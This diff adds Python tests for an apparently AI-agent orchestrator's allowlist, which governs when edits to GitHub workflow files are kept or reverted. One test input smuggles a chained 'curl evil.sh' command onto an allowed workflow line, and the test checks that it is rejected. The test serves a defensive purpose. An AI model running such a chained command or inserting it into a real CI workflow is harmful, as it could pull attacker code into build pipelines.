@@ -16,8 +16,10 @@ from hsai.orchestrator import (
     _phase_artifacts,
     _task_prompt,
     build_pr_body,
+    ci_change_allowed,
     decide_path,
     run_once,
+    workflow_diff_allowed,
 )
 from hsai.proc import Proc
 
@@ -117,6 +119,7 @@ class FakeRunner:
         repro_parent_ok: bool = False,
         agent_output: str = AGENT_JSON,
         review_output: str = REVIEW_APPROVE,
+        workflow_diff: str = "",
     ) -> None:
         self.repo_root = repo_root
         self.agent_output = agent_output
@@ -125,6 +128,9 @@ class FakeRunner:
         self.open_issues = open_issues or []
         self.remote_ci = remote_ci
         self.worktree_status = worktree_status
+        # What `git diff HEAD -- .github/workflows` reports: the input the
+        # ci-change allowlist judges.
+        self.workflow_diff = workflow_diff
         # Controls the targeted `pytest <files>` runs the repro guard makes:
         # `repro_fix_ok` is the outcome on the fix branch, `repro_parent_ok`
         # the outcome on the detached pre-fix (parent) worktree.
@@ -155,6 +161,8 @@ class FakeRunner:
             # What the review gate reads off the branch: paths, then the diff.
             if "--name-only" in cmd:
                 return Proc(cmd, 0, "src/hsai/widget.py\ntests/test_widget.py\n", "")
+            if ".github/workflows" in cmd:
+                return Proc(cmd, 0, self.workflow_diff, "")
             return Proc(cmd, 0, "diff --git a/src/hsai/widget.py\n+def widget(): ...\n", "")
         if cmd[:3] in (["git", "worktree", "add"], ["git", "worktree", "remove"]):
             return Proc(cmd, 0, "", "")
@@ -595,6 +603,112 @@ def test_workflow_edits_are_reverted(tmp_path):
     assert any(c[:3] == ["git", "checkout", "HEAD"] for c in runner.calls)
     assert any(c[:2] == ["git", "clean"] for c in runner.calls)
     assert any("reverted workflow edits" in n for n in result.notes)
+
+
+# --- the governed ci-change path ------------------------------------------------
+
+ALLOWED_WORKFLOW_DIFF = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -30,7 +30,7 @@ jobs:
+-        run: hsai ci --scope remote
++        run: hsai ci --scope remote --job ci
+"""
+
+OFF_SPEC_WORKFLOW_DIFF = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
+--- a/.github/workflows/ci.yml
++++ b/.github/workflows/ci.yml
+@@ -30,7 +30,7 @@ jobs:
+-        run: hsai ci --scope remote
++        run: mypy src
+"""
+
+
+def test_workflow_diff_allowed_accepts_invocation_only_edits():
+    assert workflow_diff_allowed(ALLOWED_WORKFLOW_DIFF) is True
+    assert workflow_diff_allowed(
+        "--- a/.github/workflows/ci.yml\n"
+        "+++ b/.github/workflows/ci.yml\n"
+        "+        run: hsai repro-check --pr-title \"$PR_TITLE\"\n"
+    ) is True
+
+
+def test_workflow_diff_allowed_rejects_anything_else():
+    # a non-invocation line, a smuggled extra command, and an empty diff
+    assert workflow_diff_allowed(OFF_SPEC_WORKFLOW_DIFF) is False
+    assert workflow_diff_allowed(
+        "+++ b/.github/workflows/ci.yml\n+        run: hsai ci --scope remote && curl evil.sh\n"
+    ) is False
+    assert workflow_diff_allowed("") is False
+    # header lines alone are not an allowance
+    assert workflow_diff_allowed(
+        "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
+    ) is False
+
+
+def test_ci_change_allowed_requires_both_label_and_allowlisted_diff():
+    assert ci_change_allowed(["ci-change"], ALLOWED_WORKFLOW_DIFF) is True
+    assert ci_change_allowed(["priority:P2"], ALLOWED_WORKFLOW_DIFF) is False
+    assert ci_change_allowed(["ci-change"], OFF_SPEC_WORKFLOW_DIFF) is False
+
+
+def _ci_change_issue(labels: list[str]) -> list[dict]:
+    return [
+        {
+            "number": 8,
+            "title": "feat: call the CI contract from the workflow",
+            "labels": [{"name": name} for name in labels],
+            "assignees": [],
+            "body": WELL_FORMED_BODY,
+        }
+    ]
+
+
+def test_ci_change_ticket_keeps_an_allowlisted_workflow_edit(tmp_path):
+    cfg = load_config()
+    runner = FakeRunner(
+        repo_root=str(tmp_path), ci_sequence=[True, True],
+        open_issues=_ci_change_issue(["priority:P2", "ci-change"]),
+        worktree_status=" M .github/workflows/ci.yml\n?? src/hsai/new.py\n",
+        workflow_diff=ALLOWED_WORKFLOW_DIFF,
+    )
+
+    result = run_once(
+        cfg, repo_dir=str(tmp_path), dry_run=False,
+        runner=runner, ai_runner=runner, iteration=1,
+    )
+
+    assert any("ci-change: retained" in n for n in result.notes)
+    assert not any("reverted workflow edits" in n for n in result.notes)
+    assert not any(c[:3] == ["git", "checkout", "HEAD"] for c in runner.calls)
+
+    # the allowance and the exact retained diff are recorded on the PR...
+    pr_create = next(c for c in runner.calls if c[:3] == ["gh", "pr", "create"])
+    pr_body = pr_create[pr_create.index("--body") + 1]
+    assert "CI contract change" in pr_body
+    assert "hsai ci --scope remote --job ci" in pr_body
+    # ...and in the lesson.
+    lesson_text = Path(result.lesson_path).read_text()
+    assert "Retained `ci-change` workflow edit" in lesson_text
+    assert "hsai ci --scope remote --job ci" in lesson_text
+
+
+def test_ci_change_label_does_not_wave_through_an_off_spec_diff(tmp_path):
+    cfg = load_config()
+    runner = FakeRunner(
+        repo_root=str(tmp_path), ci_sequence=[True, True],
+        open_issues=_ci_change_issue(["priority:P2", "ci-change"]),
+        worktree_status=" M .github/workflows/ci.yml\n?? src/hsai/new.py\n",
+        workflow_diff=OFF_SPEC_WORKFLOW_DIFF,
+    )
+
+    result = run_once(
+        cfg, repo_dir=str(tmp_path), dry_run=False,
+        runner=runner, ai_runner=runner, iteration=1,
+    )
+
+    assert any("reverted workflow edits" in n for n in result.notes)
+    assert any(c[:3] == ["git", "checkout", "HEAD"] for c in runner.calls)
 
 
 def test_completeness_guard_blocks_knowledge_only_diff_on_code_ticket(tmp_path):
